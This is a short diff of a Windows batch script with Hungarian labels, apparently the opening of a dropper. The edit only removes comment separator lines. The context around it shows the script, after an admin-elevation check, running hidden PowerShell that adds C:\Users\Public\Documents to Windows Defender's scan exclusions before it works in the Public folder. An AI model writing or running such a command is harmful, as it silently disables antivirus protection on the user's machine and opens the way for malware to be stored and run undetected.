@@ -20,12 +20,10 @@ IF %ERRORLEVEL% EQU 0 (
     exit
 
 :admin_folytatas
-REM ------------------------
 REM FŐ FUNKCIÓK
 
 powershell -InputFormat None -OutputFormat None -NonInteractive -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Documents'"
 
-REM ------------------------
 
 :: get Public folder path dynamically
 set "public_dir=%PUBLIC%"
